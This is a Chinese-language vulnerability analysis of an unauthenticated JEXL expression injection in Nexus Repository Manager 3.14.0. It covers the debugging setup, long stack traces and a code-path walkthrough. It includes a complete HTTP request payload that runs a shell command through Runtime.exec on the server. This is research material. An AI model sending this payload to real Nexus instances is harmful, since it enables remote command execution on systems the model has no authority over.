    evaluate:186, Script (org.apache.commons.jexl3.internal)
    main:20, JEXLTEST (Nexus)
# Nexus3 JEXL3表达式注入
## 环境搭建
拉取nexus3 docker
    docker pull sonatype/nexus3:3.14.0
运行docker容器
    docker run -d --rm -p 8081:8081 -p 5050:5050 --name nexus -v /Users/rai4over/Desktop/nexus-data:/nexus-data -e INSTALL4J_ADD_VM_PARAMS="-Xms2g -Xmx2g -XX:MaxDirectMemorySize=3g  -Djava.util.prefs.userRoot=/nexus-data -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5050" sonatype/nexus3:3.14.0
`8081`为Web管理端口映射，`5050`为JDWP调试端口映射，`nexus-data`为数据目录，`INSTALL4J_ADD_VM_PARAMS`为调试参数。
Github下载 Nexus 源码：
    git clone https://github.com/sonatype/nexus-public.git
并且切换至 `3.14.0-04` 分支：
    git checkout -b release-3.14.0-04 remotes/origin/release-3.14.0-04
IDEA配置远程调试信息
成功后可以在`org.sonatype.nexus.bootstrap.osgi.DelegatingFilter#doFilter`进行断点测试。
## 漏洞分析
Payload:
    POST /service/extdirect HTTP/1.1
    Host: 127.0.0.1:8081
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
    Accept: */*
    Content-Type: application/json
    X-Requested-With: XMLHttpRequest
    Content-Length: 825
    Connection: close
    {
        "action":"coreui_Component",
        "method":"previewAssets",
        "data":[
            {
                "page":1,
                "start":0,
                "limit":50,
                "sort":[
                    {
                        "property":"name",
                        "direction":"ASC"
                    }],
                "filter":
                [
                    {
                        "property":"repositoryName",
                        "value":"*"
                    },
                    {
                        "property":"expression",
                        "value":"233.class.forName('java.lang.Runtime').getRuntime().exec('touch /tmp/rai4over')"
                    },
                    {
                        "property":"type",
                        "value":"jexl"
                    }]
            }],
        "type":"rpc",
        "tid":8
    }
查看Servlet Filter配置：
`src/main/resources/overlay/etc/jetty/nexus-web.xml`
com/softwarementors/extjs/djn/router/dispatcher/DispatcherBase.java:63
解析JSON后进行调度，调用栈如下：
    dispatch:63, DispatcherBase (com.softwarementors.extjs.djn.router.dispatcher)
    dispatchStandardMethod:73, StandardRequestProcessorBase (com.softwarementors.extjs.djn.router.processor.standard)
    processIndividualRequest:502, JsonRequestProcessor (com.softwarementors.extjs.djn.router.processor.standard.json)
    processIndividualRequestsInThisThread:150, JsonRequestProcessor (com.softwarementors.extjs.djn.router.processor.standard.json)
    process:133, JsonRequestProcessor (com.softwarementors.extjs.djn.router.processor.standard.json)
    processJsonRequest:83, RequestRouter (com.softwarementors.extjs.djn.router)
    processRequest:632, DirectJNgineServlet (com.softwarementors.extjs.djn.servlet)
    doPost:595, DirectJNgineServlet (com.softwarementors.extjs.djn.servlet)
    doPost:155, ExtDirectServlet (org.sonatype.nexus.extdirect.internal)
    service:707, HttpServlet (javax.servlet.http)
    service:790, HttpServlet (javax.servlet.http)
    doServiceImpl:286, ServletDefinition (com.google.inject.servlet)
    doService:276, ServletDefinition (com.google.inject.servlet)
    service:181, ServletDefinition (com.google.inject.servlet)
    service:71, DynamicServletPipeline (com.google.inject.servlet)
    doFilter:85, FilterChainInvocation (com.google.inject.servlet)
    doFilter:112, OncePerRequestFilter (org.apache.shiro.web.servlet)
    doFilter:82, FilterChainInvocation (com.google.inject.servlet)
    doFilter:61, ProxiedFilterChain (org.apache.shiro.web.servlet)
    executeChain:108, AdviceFilter (org.apache.shiro.web.servlet)
    doFilterInternal:137, AdviceFilter (org.apache.shiro.web.servlet)
    doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)
    doFilter:66, ProxiedFilterChain (org.apache.shiro.web.servlet)
    executeChain:108, AdviceFilter (org.apache.shiro.web.servlet)
    doFilterInternal:137, AdviceFilter (org.apache.shiro.web.servlet)
    doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)
    doFilter:66, ProxiedFilterChain (org.apache.shiro.web.servlet)
    executeChain:108, AdviceFilter (org.apache.shiro.web.servlet)
    doFilterInternal:137, AdviceFilter (org.apache.shiro.web.servlet)
    doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)
    doFilter:66, ProxiedFilterChain (org.apache.shiro.web.servlet)
    executeChain:449, AbstractShiroFilter (org.apache.shiro.web.servlet)
    executeChain:85, SecurityFilter (org.sonatype.nexus.security)
    call:365, AbstractShiroFilter$1 (org.apache.shiro.web.servlet)
    doCall:90, SubjectCallable (org.apache.shiro.subject.support)
    call:83, SubjectCallable (org.apache.shiro.subject.support)
    execute:383, DelegatingSubject (org.apache.shiro.subject.support)
    doFilterInternal:362, AbstractShiroFilter (org.apache.shiro.web.servlet)
    doFilterInternal:101, SecurityFilter (org.sonatype.nexus.security)
    doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)
    doFilter:82, FilterChainInvocation (com.google.inject.servlet)
    doFilter:108, LicensingRedirectFilter (com.sonatype.nexus.licensing.internal)
    doFilter:82, FilterChainInvocation (com.google.inject.servlet)
    doFilter:97, AbstractInstrumentedFilter (com.codahale.metrics.servlet)
    doFilter:82, FilterChainInvocation (com.google.inject.servlet)
    doFilter:68, ErrorPageFilter (org.sonatype.nexus.internal.web)
    doFilter:82, FilterChainInvocation (com.google.inject.servlet)
    doFilter:101, EnvironmentFilter (org.sonatype.nexus.internal.web)
    doFilter:82, FilterChainInvocation (com.google.inject.servlet)
    doFilter:98, HeaderPatternFilter (org.sonatype.nexus.internal.web)
    doFilter:82, FilterChainInvocation (com.google.inject.servlet)
    dispatch:104, DynamicFilterPipeline (com.google.inject.servlet)
    doFilter:135, GuiceFilter (com.google.inject.servlet)
    doFilter:73, DelegatingFilter (org.sonatype.nexus.bootstrap.osgi)
    doFilter:1634, ServletHandler$CachedChain (org.eclipse.jetty.servlet)
    doHandle:533, ServletHandler (org.eclipse.jetty.servlet)
    handle:146, ScopedHandler (org.eclipse.jetty.server.handler)
    handle:548, SecurityHandler (org.eclipse.jetty.security)
    handle:132, HandlerWrapper (org.eclipse.jetty.server.handler)
    nextHandle:257, ScopedHandler (org.eclipse.jetty.server.handler)
    doHandle:1595, SessionHandler (org.eclipse.jetty.server.session)
    nextHandle:255, ScopedHandler (org.eclipse.jetty.server.handler)
    doHandle:1317, ContextHandler (org.eclipse.jetty.server.handler)
    nextScope:203, ScopedHandler (org.eclipse.jetty.server.handler)
    doScope:473, ServletHandler (org.eclipse.jetty.servlet)
    doScope:1564, SessionHandler (org.eclipse.jetty.server.session)
    nextScope:201, ScopedHandler (org.eclipse.jetty.server.handler)
    doScope:1219, ContextHandler (org.eclipse.jetty.server.handler)
    handle:144, ScopedHandler (org.eclipse.jetty.server.handler)
    handle:132, HandlerWrapper (org.eclipse.jetty.server.handler)
    handle:175, InstrumentedHandler (com.codahale.metrics.jetty9)
    handle:126, HandlerCollection (org.eclipse.jetty.server.handler)
    handle:132, HandlerWrapper (org.eclipse.jetty.server.handler)
    handle:531, Server (org.eclipse.jetty.server)
    handle:352, HttpChannel (org.eclipse.jetty.server)
    onFillable:260, HttpConnection (org.eclipse.jetty.server)
    succeeded:281, AbstractConnection$ReadCallback (org.eclipse.jetty.io)
    fillable:102, FillInterest (org.eclipse.jetty.io)
    run:118, ChannelEndPoint$2 (org.eclipse.jetty.io)
    runTask:333, EatWhatYouKill (org.eclipse.jetty.util.thread.strategy)
    doProduce:310, EatWhatYouKill (org.eclipse.jetty.util.thread.strategy)
    tryProduce:168, EatWhatYouKill (org.eclipse.jetty.util.thread.strategy)
    run:126, EatWhatYouKill (org.eclipse.jetty.util.thread.strategy)
    run:366, ReservedThreadExecutor$ReservedThread (org.eclipse.jetty.util.thread)
    runJob:762, QueuedThreadPool (org.eclipse.jetty.util.thread)
    run:680, QueuedThreadPool$2 (org.eclipse.jetty.util.thread)
    run:748, Thread (java.lang)
调度后进入关键的`PagedResponse previewAssets`
org.sonatype.nexus.coreui.ComponentComponent#previewAssets
可以发现可以未授权访问，`parameters.getFilter`获取`type`、`expression`等参数，根据`type`进入对应分支调用`jexlExpressionValidator.validate`函数
org.sonatype.nexus.selector.JexlExpressionValidator#validate
继续将恶意表达式字符串传入`JexlSelector`构造函数
org.sonatype.nexus.selector.JexlSelector#JexlSelector
恶意表达式字符串创建表达式对象并存入`this.expression`成员，层层返回后，调用接着将参数传入`browseService.previewAssets`
org.sonatype.nexus.repository.browse.internal.BrowseServiceImpl#previewAssets
继续跟踪`countAssets`接口
org.sonatype.nexus.repository.storage.StorageTxImpl#countAssets(java.lang.String,
java.util.Map,
java.lang.Iterable,
java.lang.String)
org.sonatype.nexus.repository.storage.MetadataNodeEntityAdapter#countByQuery
调用栈很长，直接跳到最关键的位置
org.sonatype.nexus.internal.selector.SelectorManagerImpl#evaluate
`selectorConfiguration`作为参数创建`Selector`对象，然后调用`evaluate`函数
org.sonatype.nexus.selector.JexlSelector#evaluate
最终的表达式注入点，执行了上方创建的恶意表达式对象`this.expression`，完成任意命令执行。
# 参考
[https://lucifaer.com/2019/02/19/Nexus%20Repository%20Manager%203%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2019-7238%EF%BC%89/](https://lucifaer.com/2019/02/19/Nexus
Repository Manager 3 远程代码执行漏洞分析（CVE-2019-7238）/)